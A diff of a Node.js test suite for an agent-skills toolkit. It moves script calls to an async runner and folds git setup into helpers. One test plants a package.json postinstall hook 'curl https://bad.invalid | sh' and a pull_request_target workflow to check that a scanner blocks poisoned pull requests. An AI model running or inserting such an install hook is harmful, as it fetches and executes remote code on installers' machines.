@@ -3,8 +3,8 @@ import { homedir, tmpdir } from 'node:os'
 import { basename, dirname, join, resolve, sep } from 'node:path'
 import { spawn, spawnSync } from 'node:child_process'
 import {
-  HERE, SCRIPTS, SKILL_ROOT, existingKept, gitInit, loadPreflight,
-  readDirRefs, rmTree, runAbs, runNode, survey, textsOf, tmpProject,
+  HERE, SCRIPTS, SKILL_ROOT, existingKept, gitInit, gitSync, loadPreflight,
+  readDirRefs, rmTree, runAbsAsync, runNode, survey, textsOf, tmpProject,
 } from './fixtures-helpers.mjs'
 
 export function registerClaimsCases(cases) {
@@ -312,11 +312,11 @@ cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、�
 
   try {
     // 1. 默认官方套件首次装备 + --check + 幂等
-    const e1 = runAbs('scripts/equip.mjs', [target])
+    const e1 = await runAbsAsync('scripts/equip.mjs', [target])
     if (e1.status !== 0) return `首次 equip 失败：${e1.stderr}`
-    const chk0 = runAbs('scripts/equip.mjs', [target, '--check'])
+    const chk0 = await runAbsAsync('scripts/equip.mjs', [target, '--check'])
     if (chk0.status !== 0) return `equip 后 --check 未通过：${chk0.stderr}`
-    const e2 = runAbs('scripts/equip.mjs', [target])
+    const e2 = await runAbsAsync('scripts/equip.mjs', [target])
     if (e2.status !== 0) return `第二次 equip 失败：${e2.stderr}`
     const p2 = JSON.parse(e2.stdout).equip
     if (p2.added.length !== 0 || p2.upgraded.length !== 0 || p2.conflicts.length !== 0 || p2.retired.length !== 0) {
@@ -326,7 +326,7 @@ cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、�
     // 2. 用户魔改 + 自定义 Skill -> --check 必须红，v1->v2 升级保留魔改与自定义，自动升级未改文件并物理删除退役文件
     const targetTri = tmpProject({ 'README.md': '# tri\n' })
     try {
-      const i1 = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1])
+      const i1 = await runAbsAsync('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1])
       if (i1.status !== 0) return `v1 装备失败：${i1.stderr}`
       // 用户修改 dev-flow/SKILL.md 且保留 old-retired/legacy.md 未改；另建用户自定义 Skill
       const customSkill = join(targetTri, '.agents', 'skills', 'my-custom', 'SKILL.md')
@@ -335,10 +335,10 @@ cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、�
       const devFlowPath = join(targetTri, '.agents', 'skills', 'dev-flow', 'SKILL.md')
       writeFileSync(devFlowPath, '# user hacked dev-flow\n')
 
-      const dirtyChk = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1, '--check'])
+      const dirtyChk = await runAbsAsync('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1, '--check'])
       if (dirtyChk.status === 0) return '用户改动托管文件后 --check 却返回 0'
 
-      const up = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV2])
+      const up = await runAbsAsync('scripts/equip.mjs', [targetTri, '--kit-dir', kitV2])
       if (up.status !== 0) return `v2 升级失败：${up.stderr}`
       const res = JSON.parse(up.stdout).equip
       if (!res.upgraded.includes('lib/shared.mjs')) return `未改旧文件没自动升级：${JSON.stringify(res)}`
@@ -352,7 +352,7 @@ cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、�
     } finally { rmTree(targetTri) }
 
     // 3. --bootstrap-empty 正反双向
-    const boot = runAbs('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
+    const boot = await runAbsAsync('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
     if (boot.status !== 0) return `空目录 --bootstrap-empty 失败：${boot.stderr}`
     for (const rel of ['package.json', 'src/index.mjs', 'test/smoke.test.mjs', 'docs/TDD.md', '.agents/skills/.pf-manifest.json']) {
       if (!existsSync(join(emptyBoot, rel))) return `bootstrap-empty 缺文件：${rel}`
@@ -361,7 +361,7 @@ cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、�
     if (smokeRun.status !== 0) return `bootstrap-empty 生成的测试没跑绿：${smokeRun.stderr || smokeRun.stdout}`
 
     // 反面：非空目录禁止 --bootstrap-empty
-    const bootNonEmpty = runAbs('scripts/equip.mjs', [target, '--bootstrap-empty', '--lang', 'node'])
+    const bootNonEmpty = await runAbsAsync('scripts/equip.mjs', [target, '--bootstrap-empty', '--lang', 'node'])
     if (bootNonEmpty.status === 0) return '非空目录却允许 --bootstrap-empty'
 
     return true
@@ -380,9 +380,9 @@ cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA
   })
   gitInit(dir)
   try {
-    const eq = runAbs('scripts/equip.mjs', [dir])
+    const eq = await runAbsAsync('scripts/equip.mjs', [dir])
     if (eq.status !== 0) return `equip 失败：${eq.stderr}`
-    const g1 = runAbs('scripts/compose-agents.mjs', [dir])
+    const g1 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
     if (g1.status !== 0) return `compose-agents 首次生成失败：${g1.stderr}`
 
     const agentsFile = join(dir, 'AGENTS.md')
@@ -394,7 +394,7 @@ cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA
     writeFileSync(agentsFile, edited, 'utf8')
 
     // 当「版本与发布」与模板不一致且与 .pf-manifest.json 基线 SHA256 不同时，必须保护跳过并保留手工内容
-    const g2 = runAbs('scripts/compose-agents.mjs', [dir])
+    const g2 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
     if (g2.status !== 0) return `保护场景刷新失败：${g2.stderr}`
     if (!/保护跳过/.test(g2.stderr || '') || !readFileSync(agentsFile, 'utf8').includes('手工微调')) {
       return `未标 customized 的手工改动没有被保护跳过：stderr=${g2.stderr}`
@@ -403,7 +403,7 @@ cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA
     // 2. 反面：AGENTS.md 超 30KB 时刷新必须退出 1 阻断写入
     const oversized = `${original}\n\n## 补充说明\n\n${'x'.repeat(32000)}\n`
     writeFileSync(agentsFile, oversized, 'utf8')
-    const g3 = runAbs('scripts/compose-agents.mjs', [dir])
+    const g3 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
     if (g3.status === 0) return 'AGENTS.md 超过 30720 字节时 compose-agents 没有报错阻断'
     if (!readFileSync(agentsFile, 'utf8').includes('## 补充说明')) return '超限阻断时改动了原文件'
 
@@ -418,19 +418,18 @@ cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解�
     'package-lock.json': '{"name":"deps-demo","lockfileVersion":3}\n',
     'README.md': '# deps\n',
   })
-  gitInit(dir)
-  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+  gitInit(dir, { branch: 'main' })
   const mainPkgFile = join(dir, 'node_modules', 'fake-pkg', 'index.js')
   mkdirSync(dirname(mainPkgFile), { recursive: true })
   writeFileSync(mainPkgFile, 'module.exports = { ok: true }\n')
 
   const wt = join(dir, '.worktrees', 'impl-deps')
   try {
-    const addWt = spawnSync('git', ['worktree', 'add', wt, '-b', 'feat/deps-test'], { cwd: dir, encoding: 'utf8' })
+    const addWt = gitSync(dir, ['worktree', 'add', wt, '-b', 'feat/deps-test'], { encoding: 'utf8' })
     if (addWt.status !== 0) return `创建 worktree 失败：${addWt.stderr}`
 
     // 正面：锁文件一致 -> mount 挂载并可读
-    const m1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
+    const m1 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
     if (m1.status !== 0) return `mount 失败：${m1.stderr}`
     const wtPkgFile = join(wt, 'node_modules', 'fake-pkg', 'index.js')
     if (!existsSync(wtPkgFile) || !readFileSync(wtPkgFile, 'utf8').includes('ok: true')) {
@@ -438,7 +437,7 @@ cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解�
     }
 
     // 正面：unmount 安全解绑后主仓 node_modules 完好无损
-    const u1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
+    const u1 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
     if (u1.status !== 0) return `unmount 失败：${u1.stderr}`
     if (existsSync(join(wt, 'node_modules'))) return 'unmount 后 worktree node_modules 依然存在'
     if (!existsSync(mainPkgFile) || !readFileSync(mainPkgFile, 'utf8').includes('ok: true')) {
@@ -447,7 +446,7 @@ cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解�
 
     // 反面：worktree 锁文件变化 -> 拒绝挂载，自动隔离
     writeFileSync(join(wt, 'package-lock.json'), '{"name":"deps-demo","lockfileVersion":3,"changed":true}\n')
-    const m2 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
+    const m2 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
     if (m2.status !== 0) return `锁文件不一致时 mount 应安全跳过而非崩溃：${m2.stderr}`
     const m2Json = JSON.parse(m2.stdout)
     if (m2Json.mode !== 'isolated' || m2Json.reason !== 'lockfile-changed' || (m2Json.mismatches?.length ?? 0) === 0 || m2Json.mounted.length !== 0 || existsSync(join(wt, 'node_modules'))) {
@@ -456,8 +455,8 @@ cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解�
 
     return true
   } finally {
-    try { runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
-    spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
+    try { await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
+    gitSync(dir, ['worktree', 'remove', '--force', wt])
     rmTree(dir)
   }
 }])
@@ -497,58 +496,55 @@ cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖�
     'docs/TDD.md': '# TDD\n',
     'src/app.mjs': 'export const n = 1\n',
   })
-  gitInit(localDir)
-  spawnSync('git', ['branch', '-M', 'main'], { cwd: localDir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.name', 't'], { cwd: localDir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: localDir, stdio: 'ignore' })
+  gitInit(localDir, { branch: 'main', name: 't', email: 't@t.t' })
 
   try {
-    const start1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
+    const start1 = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
     if (start1.status !== 0) return `flow start 失败：${start1.stderr}`
     const ledger1 = JSON.parse(start1.stdout)
     const wtRoot = join(localDir, ledger1.worktreePath)
 
     // 建未勾选 Todo -> finalize 必须失败
-    const todoInit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
+    const todoInit = await runAbsAsync('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
     if (todoInit.status !== 0) return `doc-plan init todo 失败：${todoInit.stderr}`
     const todoInfo = JSON.parse(todoInit.stdout)
 
-    const finBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    const finBlocked = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
     if (finBlocked.status === 0) return 'Todo 仍有未勾选条目，finalize 却放行了'
 
     // 勾选 Todo 并提交；故意不运行 finalize，先 verify 再 submit -> submit 必须返回 3（BLOCKED_NOT_FINALIZED）
     const todoAbs = join(wtRoot, todoInfo.file)
     writeFileSync(todoAbs, readFileSync(todoAbs, 'utf8').replace(/- \[ \]/g, '- [x]'))
-    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
-    spawnSync('git', ['commit', '-qm', 'check todo'], { cwd: wtRoot, stdio: 'ignore' })
+    gitSync(wtRoot, ['add', '-A'])
+    gitSync(wtRoot, ['commit', '-qm', 'check todo'])
 
-    const v1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
+    const v1 = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
     if (v1.status !== 0) return `verify 失败：${v1.stderr}`
-    const subNoFin = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    const subNoFin = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
     if (subNoFin.status !== 3 || !/BLOCKED_NOT_FINALIZED/.test(subNoFin.stderr)) {
       return `未 finalize 时 submit 未拦截：exit=${subNoFin.status} stderr=${subNoFin.stderr}`
     }
 
     // finalize 后再改非文档代码并提交，使 verifiedHead !== HEAD -> submit 必须拦截
-    const finOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    const finOk = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
     if (finOk.status !== 0) return `finalize 失败：${finOk.stderr}`
-    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
-    spawnSync('git', ['commit', '-qm', 'archive todo'], { cwd: wtRoot, stdio: 'ignore' })
+    gitSync(wtRoot, ['add', '-A'])
+    gitSync(wtRoot, ['commit', '-qm', 'archive todo'])
 
     writeFileSync(join(wtRoot, 'src/app.mjs'), 'export const n = 2\n')
-    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
-    spawnSync('git', ['commit', '-qm', 'code change after verify'], { cwd: wtRoot, stdio: 'ignore' })
-    const subStale = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    gitSync(wtRoot, ['add', '-A'])
+    gitSync(wtRoot, ['commit', '-qm', 'code change after verify'])
+    const subStale = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
     if (subStale.status !== 3) return `代码变更后 verifiedHead 失效未拦截 submit：exit=${subStale.status} stderr=${subStale.stderr}`
 
     // 重跑 finalize + verify -> submit 放行退出 0
-    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
-    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
-    const subOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
+    const subOk = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
     if (subOk.status !== 0) return `本地完整校验后 submit 失败：exit=${subOk.status} stderr=${subOk.stderr}`
   } finally {
     const wtCleanup = join(localDir, '.worktrees', 'impl-t-flow')
-    spawnSync('git', ['worktree', 'remove', '--force', wtCleanup], { cwd: localDir, stdio: 'ignore' })
+    gitSync(localDir, ['worktree', 'remove', '--force', wtCleanup])
     rmTree(localDir)
   }
 
@@ -558,15 +554,10 @@ cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖�
     'package.json': '{"name":"fork-demo","version":"1.0.0"}\n',
     'README.md': '# fork-demo\n',
   })
-  gitInit(forkDir)
-  spawnSync('git', ['branch', '-M', 'main'], { cwd: forkDir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.name', 'me'], { cwd: forkDir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.email', 'me@example.com'], { cwd: forkDir, stdio: 'ignore' })
-  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/me/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
-  spawnSync('git', ['remote', 'add', 'upstream', 'https://github.com/upstream/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
+  gitInit(forkDir, { branch: 'main', name: 'me', email: 'me@example.com', origin: 'https://github.com/me/fork-demo.git', upstream: 'https://github.com/upstream/fork-demo.git' })
 
   try {
-    const insp = runAbs('kit/skills/dev-flow/scripts/flow.mjs', [
+    const insp = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', [
       'inspect', 'https://github.com/upstream/fork-demo/issues/12', 'https://github.com/upstream/fork-demo/pull/34', '--json',
     ], { cwd: forkDir })
     if (insp.status !== 0) return `inspect 失败：${insp.stderr}`
@@ -576,18 +567,18 @@ cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖�
       return `inspect 未输出已有 PR 复用提示：${JSON.stringify(inspJson.inputs)}`
     }
 
-    const fStart = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
+    const fStart = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
     if (fStart.status !== 0) return `fork start 失败：${fStart.stderr}`
-    const fVerify = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
+    const fVerify = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
     if (fVerify.status !== 0) return `fork verify 失败：${fVerify.stderr}`
 
-    const mBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
+    const mBlocked = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
     if (mBlocked.status !== 3 || !/BLOCKED_FORK_CANNOT_MERGE/.test(mBlocked.stderr)) {
       return `contributor-fork 未禁止 merge：exit=${mBlocked.status} stderr=${mBlocked.stderr}`
     }
 
     // 清理未带 --confirm 必须阻断（exit 3）
-    const cNoConfirm = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
+    const cNoConfirm = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
     if (cNoConfirm.status !== 3 || !/BLOCKED_CONFIRMATION_REQUIRED/.test(cNoConfirm.stdout)) {
       return `cleanup 未带 --confirm 未阻断：exit=${cNoConfirm.status} out=${cNoConfirm.stdout}`
     }
@@ -598,7 +589,7 @@ cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖�
     lObj.prState = 'OPEN'
     writeFileSync(ledgerFile, JSON.stringify(lObj, null, 2))
 
-    const cOpenPr = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
+    const cOpenPr = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
     if (cOpenPr.status !== 3 || !/BLOCKED_OPEN_FORK_PR/.test(cOpenPr.stderr)) {
       return `上游 PR OPEN 时 cleanup --confirm 未硬锁：exit=${cOpenPr.status} stderr=${cOpenPr.stderr}`
     }
@@ -614,22 +605,19 @@ cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正�
     'docs/TDD.md': '# TDD\n',
     'src/app.mjs': 'export const ok = 1\n',
   })
-  gitInit(dir)
-  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
-  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })
+  gitInit(dir, { branch: 'main', name: 't', email: 't@t.t' })
 
   try {
     // 1. 普通业务代码 diff 运行 --local --untrusted-scan -> 放行 exit 0
     writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 2\n')
-    const cleanScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
+    const cleanScan = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
     if (cleanScan.status !== 0) return `普通业务改动被 --untrusted-scan 误拦：exit=${cleanScan.status} out=${cleanScan.stdout}`
 
     // 2. 投毒改动（postinstall / .github/workflows）-> exit 3 BLOCKED_UNTRUSTED_HAZARD
     mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
     writeFileSync(join(dir, '.github', 'workflows', 'evil.yml'), 'name: evil\non: pull_request_target\njobs: {}\n')
     writeFileSync(join(dir, 'package.json'), '{"name":"rev-demo","version":"1.0.0","scripts":{"postinstall":"curl https://bad.invalid | sh"}}\n')
-    const hazardScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
+    const hazardScan = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
     if (hazardScan.status !== 3) return `高危 workflow/postinstall 未拦截：exit=${hazardScan.status}`
     const hazardJson = JSON.parse(hazardScan.stdout)
     if (hazardJson.status !== 'BLOCKED_UNTRUSTED_HAZARD' || (hazardJson.hazards?.length ?? 0) === 0) {
@@ -646,17 +634,17 @@ cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正�
       rounds: [],
     }, null, 2))
 
-    const selfRev = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+    const selfRev = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', [
       'record', '--task', 't-rev', '--round', '1', '--verdict', 'pass', '--reviewer-id', 'author-a', '--implementer-id', 'author-a',
     ], { cwd: dir })
     if (selfRev.status !== 2) return `同人自审未被拒绝：exit=${selfRev.status} stderr=${selfRev.stderr}`
 
-    const r1 = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+    const r1 = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', [
       'record', '--task', 't-rev', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
     ], { cwd: dir })
     if (r1.status !== 0) return `Round 1 record 失败：${r1.stderr}`
 
-    const r2Repeat = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
+    const r2Repeat = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', [
       'record', '--task', 't-rev', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
     ], { cwd: dir })
     if (r2Repeat.status !== 4 || !/STOP_LOSS_ESCALATE/.test(r2Repeat.stdout + r2Repeat.stderr)) {
@@ -665,9 +653,9 @@ cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正�
 
     // 第 3 轮上限测试（无重复问题，第 3 轮仍 verdict=changes 必须 exit 4）
     writeFileSync(join(ledgerDir, 't-r3.json'), JSON.stringify({ taskId: 't-r3', implementerId: 'author-a', rounds: [] }, null, 2))
-    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 问题一'], { cwd: dir })
-    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C2: 问题二'], { cwd: dir })
-    const r3Stop = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '3', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C3: 问题三'], { cwd: dir })
+    await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 问题一'], { cwd: dir })
+    await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C2: 问题二'], { cwd: dir })
+    const r3Stop = await runAbsAsync('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '3', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C3: 问题三'], { cwd: dir })
     if (r3Stop.status !== 4) return `第 3 轮上限未触发停损：exit=${r3Stop.status}`
 
     // 4. govern-audit.mjs --audit-only 与 reconcile
@@ -680,14 +668,14 @@ cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正�
     })
     gitInit(cleanAuditDir)
     try {
-      runAbs('scripts/equip.mjs', [cleanAuditDir])
-      runAbs('scripts/compose-agents.mjs', [cleanAuditDir])
-      const auditRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
+      await runAbsAsync('scripts/equip.mjs', [cleanAuditDir])
+      await runAbsAsync('scripts/compose-agents.mjs', [cleanAuditDir])
+      const auditRun = await runAbsAsync('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
       if (auditRun.status !== 0) return `govern-audit --audit-only 失败：exit=${auditRun.status} stderr=${auditRun.stderr}`
       const auditJson = JSON.parse(auditRun.stdout)
       if (!Array.isArray(auditJson.findings)) return `govern-audit 输出缺 findings：${auditRun.stdout}`
 
-      const recRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
+      const recRun = await runAbsAsync('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
       if (recRun.status !== 0) return `govern-audit reconcile 失败：exit=${recRun.status} stderr=${recRun.stderr}`
       const recJson = JSON.parse(recRun.stdout)
       if (!Array.isArray(recJson.findings)) return `govern-audit reconcile 输出缺 findings：${recRun.stdout}`
